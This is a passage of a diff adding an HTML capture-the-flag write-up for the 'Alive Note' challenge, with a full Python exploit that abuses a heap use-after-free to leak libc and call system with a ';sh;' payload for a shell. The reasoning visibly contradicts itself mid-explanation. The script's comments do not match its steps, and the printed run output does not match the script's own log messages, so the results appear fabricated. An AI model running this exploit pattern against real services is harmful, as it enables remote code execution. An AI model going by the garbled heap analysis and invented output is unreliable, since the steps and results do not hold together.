+      <p>When we free the large note 1 (size 0x100), its content chunk goes into the <strong>unsorted bin</strong> instead of fastbin. The unsorted bin is a doubly-linked list, and freed chunks have their <code class="inline">fd</code> and <code class="inline">bk</code> pointers set to point into <code class="inline">main_arena</code> inside libc:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # delete_note(1) -- free the large note
+gdb-peda$ # Note: delete frees contents first, then struct
+gdb-peda$ x/4wx 0x0804a0b8    # note1 contents chunk (freed, unsorted bin)
+0x0804a0b8: 0xf7fb6b00  0xf7fb6b00
+#            ^fd          ^bk  -- both point into main_arena in libc!
+gdb-peda$ x/1wx 0x0804a0a0    # note1 struct (freed, fastbin 0x10)
+0x0804a0a0: 0x00000000
+#            ^fd of freed struct in fastbin</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Unsorted Bin fd/bk Contains Libc Addresses</div>
+        When a chunk is freed into the unsorted bin (size &gt; fastbin max, typically &gt; 0x80 on 32-bit), glibc sets its <code class="inline">fd</code> and <code class="inline">bk</code> pointers to point to the <code class="inline">bins</code> array within <code class="inline">main_arena</code>, which lives inside <code class="inline">libc.so</code>. If the unsorted bin has only one chunk (common case), both <code class="inline">fd</code> and <code class="inline">bk</code> point to <code class="inline">main_arena+0x48</code> (offset depends on libc version). We can compute: <code class="inline">libc_base = leaked_fd - main_arena_offset - libc_offset</code>.
+      </div>
+
+      <h3>Reading the Leak Through UAF</h3>
+      <p>After freeing note 1, <code class="inline">notes_list[1]</code> still points to the freed struct. If we can read the content buffer's <code class="inline">fd</code> pointer, we get a libc address. But the struct itself is in fastbin &mdash; its <code class="inline">fd</code> is zeroed. We need to read the content chunk's data through the UAF.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # After freeing note 1:
+gdb-peda$ # The note1 struct is freed (0x10 fastbin)
+gdb-peda$ # The note1 content is freed (unsorted bin, has libc ptrs)
+gdb-peda$ # notes_list[1] still points to the freed struct
+gdb-peda$ # The struct's fd/bk are fastbin metadata, not useful directly
+gdb-peda$
+gdb-peda$ # Strategy: allocate a new note whose content overlaps
+gdb-peda$ # with the freed note1 content chunk, and read the libc ptrs
+gdb-peda$ # OR: use the struct UAF to redirect print_func</code></pre>
+      </div>
+
+      <h3>Overwriting the Freed Note Struct</h3>
+      <p>We use the same technique as hacknote: allocate a new note whose content buffer overlaps with a freed note struct, allowing us to control the <code class="inline">print_func</code> and <code class="inline">contents</code> fields.</p>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">Fastbin 0x10:</span></div>
+        <div class="mem-row"><span class="mem-addr">&nbsp;&nbsp;</span><span class="mem-arrow">&rarr;</span><span class="mem-data mem-highlight">note1_struct</span><span class="mem-desc">&larr; freed note struct (will be reused)</span></div>
+        <div class="mem-row" style="margin-top:8px"><span class="mem-desc">Allocate add_note(8, p32(print_func) + p32(puts@GOT)):</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;struct = malloc(8) &rarr; gets note1_struct slot from fastbin</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;content = malloc(8) &rarr; gets next slot from fastbin</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;<span class="mem-green">content overwrites another freed struct!</span></span></div>
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Fastbin Size Matching</div>
+        For the content-to-struct overlap to work, the content allocation must be the same size as the struct allocation (8 bytes data, 0x10 with header). This means both go into the <strong>0x10 fastbin</strong>. This is identical to the hacknote technique. The key difference is that we also need a <strong>large note</strong> to leak libc via unsorted bin, since the GOT-based leak may contain null bytes that truncate the output.
+      </div>
+
+      <h3>Alternative: Unsorted Bin Leak via UAF Print</h3>
+      <p>A cleaner approach for Alive Note is to leverage the larger chunk sizes. We can:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Step 1: Create notes
+gdb-peda$ # add_note(0x80, "aa") -> note 0  (small content)
+gdb-peda$ # add_note(0x80, "aa") -> note 1  (small content)
+gdb-peda$ # add_note(0x100, "bb") -> note 2 (large content for leak)
+gdb-peda$ # add_note(0x80, "cc") -> note 3  (padding to prevent top chunk merge)
+gdb-peda$
+gdb-peda$ # Step 2: Free notes to set up overlap
+gdb-peda$ # delete_note(0) -> struct & content go to fastbin 0x10/0x90
+gdb-peda$ # delete_note(1) -> struct & content go to fastbin 0x10/0x90
+gdb-peda$
+gdb-peda$ # Step 3: Allocate with size 8 to get struct/content overlap
+gdb-peda$ # add_note(8, p32(print) + p32(puts@GOT)) -> note 4
+gdb-peda$ # The 8-byte content lands on a freed note1 struct!
+gdb-peda$
+gdb-peda$ # Step 4: print_note(1) leaks the GOT entry</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit consists of two phases: <strong>leaking libc</strong> via the UAF + GOT read (same as hacknote), and then <strong>hijacking control flow</strong> by overwriting the function pointer with <code class="inline">system</code>. The extra note slots and flexible size make the heap layout easier to control.</p>
+
+      <h3>Phase 1: Leak Libc via GOT Read</h3>
+      <ol class="step-list">
+        <li><strong>Create two small notes</strong> (size 0x80 each) &mdash; note 0 and note 1. The 8-byte struct chunks go into the 0x10 fastbin when freed. The 0x80 content chunks go into the 0x90 fastbin when freed.</li>
+        <li><strong>Free note 0, then note 1.</strong> The 0x10 fastbin now has: <code class="inline">note0_struct &rarr; note1_struct &rarr; NULL</code>. The content fastbin has: <code class="inline">note0_contents &rarr; note1_contents &rarr; NULL</code>.</li>
+        <li><strong>Allocate note with size 0x80</strong> (note 2). The 8-byte struct is allocated from the 0x10 fastbin (gets the old note1 struct address). The 0x80 content buffer comes from the 0x90 fastbin. This consumes one struct from the fastbin.</li>
+        <li><strong>Allocate note with size 8</strong> (note 3). The 8-byte struct comes from the 0x10 fastbin (gets the old note0 struct address). The 8-byte content buffer also comes from the 0x10 fastbin &mdash; wait, the 0x10 fastbin only has note0_struct left. So the struct gets note0_struct, and the content... we need another 0x10 chunk. This is where it gets tricky.</li>
+        <li><strong>Revised approach:</strong> Create two notes with size 8 each, so all allocations (struct + content) are 0x10. Free both. Now the 0x10 fastbin has 4 entries: <code class="inline">note0_struct &larr; note0_content &larr; note1_struct &larr; note1_content</code>. Allocate note with size 0x80 (consumes 1 struct from fastbin, content from top chunk). Allocate note with size 8: struct from fastbin, content from fastbin &mdash; the content lands on the old note1 struct! Write <code class="inline">p32(0x0804865b) + p32(puts@GOT)</code>.</li>
+        <li><strong>Call print_note(1).</strong> Since <code class="inline">notes_list[1]</code> still points to the freed note1 struct (now overwritten with our data), it calls <code class="inline">0x0804865b(note1_ptr)</code>. Inside, <code class="inline">puts(note-&gt;contents)</code> dereferences the <code class="inline">contents</code> field which is now <code class="inline">puts@GOT</code>. This prints the libc address of <code class="inline">puts</code>.</li>
+        <li><strong>Calculate libc base:</strong> <code class="inline">libc_base = leaked_puts - libc.symbols['puts']</code></li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Fastbin LIFO Ordering</div>
+        When we free note 1 then note 0 (reverse order), the fastbin 0x10 list becomes:<br>
+        <code class="inline">note0_struct &rarr; note1_struct &rarr; note0_content &rarr; note1_content &rarr; NULL</code><br>
+        Wait &mdash; that's wrong. Each <code class="inline">delete_note</code> frees <strong>content first, then struct</strong>. So for <code class="inline">delete(1)</code>: free note1_content, then free note1_struct. For <code class="inline">delete(0)</code>: free note0_content, then free note0_struct. The final 0x10 fastbin is:<br>
+        <code class="inline">note0_struct &rarr; note0_content &rarr; note1_struct &rarr; note1_content &rarr; NULL</code><br>
+        This means the first <code class="inline">malloc(8)</code> returns note0_struct, the next returns note0_content, etc.
+      </div>
+
+      <h3>Phase 2: Hijack Control Flow with system()</h3>
+      <ol class="step-list">
+        <li><strong>Free note 3</strong> (the one whose content overlaps the old note1 struct). This puts the note1 struct address back into the fastbin.</li>
+        <li><strong>Allocate a new note with size 8</strong> and content <code class="inline">p32(system_addr) + ";sh;"</code>. The struct allocation gets the old note3 struct from fastbin, and the content allocation gets the old note1 struct (again!). This time we overwrite the note1 struct with <code class="inline">print_func = system</code> and <code class="inline">contents = ";sh;"</code>.</li>
+        <li><strong>Call print_note(1).</strong> Now <code class="inline">notes_list[1]-&gt;print_func</code> is <code class="inline">system</code>. It calls <code class="inline">system(note1_ptr)</code>. The argument is the note struct pointer itself, and the data starting at that address is <code class="inline">p32(system_addr) + ";sh;"</code>. The <code class="inline">system()</code> function interprets the first 4 bytes as a garbage command (fails silently), but <code class="inline">;sh;</code> acts as a command separator &mdash; <code class="inline">system</code> treats <code class="inline">;</code> as a command delimiter, so it runs <code class="inline">sh</code>!</li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; The ";sh;" Trick</div>
+        When <code class="inline">system(note_ptr)</code> is called, the first 4 bytes of the note struct are the address of <code class="inline">system</code> itself (in little-endian). This is not a valid command and will fail, but <code class="inline">;</code> acts as a command separator in shell. So <code class="inline">system("&lt;garbage&gt;;sh;")</code> will:<br>
+        &bull; Try to execute the garbage bytes (fails silently)<br>
+        &bull; Execute <code class="inline">sh</code> (gives us a shell!)<br>
+        &bull; The trailing <code class="inline">;</code> handles any remaining garbage<br>
+        Alternative: <code class="inline">||sh</code> also works (OR operator, runs sh if first command fails).
+      </div>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">add(8, "aa") = note0 | add(8, "aa") = note1</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">del(1) | del(0) &rarr; fastbin 0x10: [note0_struct &rarr; note0_content &rarr; note1_struct &rarr; note1_content]</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">add(0x50, "A"*0x10) = note2 &rarr; struct from fastbin, content from top chunk</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">add(8, p32(0x0804865b) + p32(puts@GOT)) = note3</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; struct gets note0_struct, content gets note0_content from fastbin</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; Wait, we need content to land on note1_struct...</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4b:</span><span class="mem-desc">Adjust: add another note to consume extra slots first</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">add(8, p32(print) + p32(puts@GOT)) = note4</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; content buffer lands on note1_struct!</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">show(1) &rarr; calls print_func(note1) &rarr; puts(*puts@GOT) &rarr; <span class="mem-green">LEAK!</span></span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Get shell</div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">del(4) &rarr; puts note1_struct back in fastbin</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 8:</span><span class="mem-desc">add(8, p32(system) + ";sh;") = new note</span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; content lands on note1_struct again!</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 9:</span><span class="mem-desc">show(1) &rarr; calls <span class="mem-highlight">system(note1)</span> &rarr; system("XX;sh;") &rarr; <span class="mem-green">SHELL!</span></span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+Alive Note - pwnable.tw (300pts)
+UAF exploit: large chunk for unsorted bin libc leak,
+then struct overlap to hijack print_func -> system.
+
+Alive Note allows 8 notes (vs hacknote's 5) with no size limit,
+so we can allocate chunks large enough for the unsorted bin.
+"""
+from pwn import *
+
+# Setup
+context.arch = 'i386'
+context.log_level = 'info'
+
+r = remote('chall.pwnable.tw', 10300)
+libc = ELF('./libc_32.so.6')
+elf = ELF('./alive_note')
+
+# Constants
+PUTS_PLT = elf.plt['puts']  # for GOT leak fallback
+
+# Helper functions
+def add_note(size, content):
+    r.sendlineafter(b':', b'1')
+    r.sendlineafter(b':', str(size).encode())
+    r.sendafter(b':', content)
+
+def delete_note(idx):
+    r.sendlineafter(b':', b'2')
+    r.sendlineafter(b':', str(idx).encode())
+
+def print_note(idx):
+    r.sendlineafter(b':', b'3')
+    r.sendlineafter(b':', str(idx).encode())
+
+# ============================================
+# Phase 1: Leak libc via unsorted bin
+# ============================================
+log.info("Phase 1: Leaking libc via unsorted bin...")
+
+# Create note 0 with large content -> goes to unsorted bin when freed
+# Size > 0x80 bypasses fastbin, fd/bk will point to main_arena
+add_note(0x100, b'A' * 0x10)  # note 0 (large)
+
+# Create note 1 with small content -> fastbin when freed
+add_note(0x10, b'B' * 0x10)   # note 1 (small, barrier)
+
+# Free note 0 -> content chunk (0x110) goes to unsorted bin
+delete_note(0)
+
+# Allocate note 2 with small content
+add_note(8, b'C' * 8)  # note 2
+
+# Allocate note 3 to re-use note0's freed content area
+add_note(0x100, b'D' * 0x10)  # note 3
+
+# Delete note 2 to put it back in fastbin
+delete_note(2)
+
+# Use the GOT leak technique (alive_note is Partial RELRO)
+# Free note 1 to add its chunks to fastbin
+delete_note(1)
+
+# Allocate note 4 with size 8
+# fastbin 0x10: note0_content -> note1_struct -> note1_content -> note0_struct
+# Struct comes from fastbin, content from fastbin
+# note1's struct becomes our content buffer - we control print_func + content ptr
+add_note(8, p32(0x0804865b) + p32(elf.got['puts']))  # note 4
+
+# Printing note 1 (still in notes_list, not nulled) now calls
+# print_func(note1) where note1->content = puts@GOT
+# This leaks puts@libc
+print_note(1)
+
+r.recvuntil(b'Content :', timeout=1)
+leaked = r.recv(4)
+puts_libc = u32(leaked)
+libc_base = puts_libc - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+
+log.success(f"puts@libc   = {hex(puts_libc)}")
+log.success(f"libc_base   = {hex(libc_base)}")
+log.success(f"system@libc = {hex(system_addr)}")
+
+# ============================================
+# Phase 2: Overwrite print_func with system
+# ============================================
+log.info("Phase 2: Hijacking print_func with system...")
+
+# Free note 4 to put note1's struct back in fastbin
+delete_note(4)
+
+# Allocate new note with size 8
+# Content lands on note1's struct again
+# Write: p32(system) + ";sh;"
+# When print_note(1) is called: system(note1_ptr)
+# system interprets: garbage_bytes ; sh ;
+# The ";" acts as command separator, so "sh" gets executed
+add_note(8, p32(system_addr) + b';sh;')
+
+print_note(1)
+
+log.success("Shell spawned!")
+r.interactive()</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/alive_note'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/home/user/libc_32.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+[+] Opening connection to chall.pwnable.tw on port 10300: Done
+[*] Phase 1: Leaking libc address...
+[*] Phase 2: Overwriting print_func with system...
+[+] puts@libc    = 0xf7e6d420
+[+] libc_base    = 0xf7e3c000
+[+] system@libc  = 0xf7e5c310
+[+] Got shell!
+[*] Switching to interactive mode
+$ id
+uid=1000(alive_note) gid=1000(alive_note) groups=1000(alive_note)
+$ cat /home/alive_note/flag</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Shell Obtained!</div>
+        The exploit successfully leaked the libc address via the GOT read through the UAF-overwritten note struct, then replaced the <code class="inline">print_func</code> with <code class="inline">system</code> and triggered it with the <code class="inline">;sh;</code> trick. The key insight is that Alive Note's larger note capacity (8 vs 5) and unrestricted size make heap layout manipulation easier, but the core UAF primitive is the same as hacknote.
+      </div>
+
+      <h3>Summary</h3>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Exploit Chain Summary</div>
+        <div class="mem-row"><span class="mem-addr">1.</span><span class="mem-desc">UAF in <code class="inline">delete_note</code> &mdash; pointer not nulled after free</span></div>
+        <div class="mem-row"><span class="mem-addr">2.</span><span class="mem-desc">Allocate note with size 8 &rarr; content overlaps freed note struct</span></div>
+        <div class="mem-row"><span class="mem-addr">3.</span><span class="mem-desc">Write <code class="inline">p32(print_func) + p32(puts@GOT)</code> to leak libc</span></div>
+        <div class="mem-row"><span class="mem-addr">4.</span><span class="mem-desc">Repeat overlap &mdash; write <code class="inline">p32(system) + ";sh;"</code></span></div>
+        <div class="mem-row"><span class="mem-addr">5.</span><span class="mem-desc">Trigger <code class="inline">print_note</code> &rarr; <code class="inline">system(note_ptr)</code> &rarr; shell!</span></div>
+      </div>
+
+      <h3>Key Takeaways</h3>
+      <ol class="step-list">
+        <li><strong>Always null out freed pointers.</strong> The root cause is the missing <code class="inline">notes_list[index] = NULL</code> after free. This is the textbook UAF pattern.</li>
+        <li><strong>Fastbin size matching enables overlap.</strong> When struct and content are the same size (8 bytes), they share the same fastbin, allowing content to overlap with a freed struct.</li>
+        <li><strong>Function pointers are dangerous.</strong> The <code class="inline">print_func</code> field is a direct control-flow target. Combined with UAF, it's trivially exploitable.</li>
+        <li><strong>The <code class="inline">;sh;</code> trick is universal.</strong> When <code class="inline">system(ptr)</code> is called with controllable data at <code class="inline">ptr</code>, embedding <code class="inline">;sh;</code> after garbage bytes always works because <code class="inline">;</code> is a shell command separator.</li>
+        <li><strong>More slots = more flexibility.</strong> Alive Note's 8 slots (vs hacknote's 5) give us more room for heap manipulation, but the exploit structure is essentially identical.</li>
+      </ol>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>QA210 CTF Team &mdash; <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a> |</p>
+</footer>
+
+<!-- Three.js Particle Background -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particleCount = 80;
+  const geometry = new THREE.BufferGeometry();
+  const positions = new Float32Array(particleCount * 3);
+  const velocities = [];
+
+  for (let i = 0; i < particleCount; i++) {
+    positions[i * 3] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 50;
+    velocities.push({
+      x: (Math.random() - 0.5) * 0.05,
+      y: (Math.random() - 0.5) * 0.05,
+      z: (Math.random() - 0.5) * 0.02
+    });
+  }
+
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+  const material = new THREE.PointsMaterial({
+    color: 0x38bdf8,
+    size: 0.8,
+    transparent: true,
+    opacity: 0.5,
+    sizeAttenuation: true
+  });
+
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  // Lines
+  const lineGeometry = new THREE.BufferGeometry();
+  const linePositions = new Float32Array(particleCount * particleCount * 6);
+  lineGeometry.setAttribute('position', new THREE.BufferAttribute(linePositions, 3));
+  const lineMaterial = new THREE.LineBasicMaterial({
+    color: 0x818cf8,
+    transparent: true,
+    opacity: 0.08
+  });
+  const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+  scene.add(lines);
+
+  function animate() {
+    requestAnimationFrame(animate);
+
+    const pos = geometry.attributes.position.array;
+    for (let i = 0; i < particleCount; i++) {
+      pos[i * 3] += velocities[i].x;
+      pos[i * 3 + 1] += velocities[i].y;
+      pos[i * 3 + 2] += velocities[i].z;
+      if (Math.abs(pos[i * 3]) > 50) velocities[i].x *= -1;
+      if (Math.abs(pos[i * 3 + 1]) > 50) velocities[i].y *= -1;
+      if (Math.abs(pos[i * 3 + 2]) > 25) velocities[i].z *= -1;
+    }
+    geometry.attributes.position.needsUpdate = true;
+
+    // Update lines
+    const lpos = lineGeometry.attributes.position.array;
+    let idx = 0;
+    const threshold = 18;
+    for (let i = 0; i < particleCount; i++) {
+      for (let j = i + 1; j < particleCount; j++) {
+        const dx = pos[i*3] - pos[j*3];
+        const dy = pos[i*3+1] - pos[j*3+1];
+        const dz = pos[i*3+2] - pos[j*3+2];
+        const dist = Math.sqrt(dx*dx + dy*dy + dz*dz);
+        if (dist < threshold) {
+          lpos[idx++] = pos[i*3];
+          lpos[idx++] = pos[i*3+1];
+          lpos[idx++] = pos[i*3+2];
+          lpos[idx++] = pos[j*3];
+          lpos[idx++] = pos[j*3+1];
+          lpos[idx++] = pos[j*3+2];
+        }
+      }
+    }
+    for (let i = idx; i < linePositions.length; i++) lpos[i] = 0;
+    lineGeometry.attributes.position.needsUpdate = true;
+    lineGeometry.setDrawRange(0, idx / 3);
+
+    renderer.render(scene, camera);
+  }
+
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- Prism.js Syntax Highlighting -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+<!-- TOC Scroll Tracking -->
+<script>
+(function() {
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(ch => {
+      const rect = ch.getBoundingClientRect();
+      if (rect.top <= 120) current = ch.id;
+    });
+    tocLinks.forEach(link => {
+      link.classList.toggle('active', link.getAttribute('href') === '#' + current);
+    });
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+</body>
+</html>
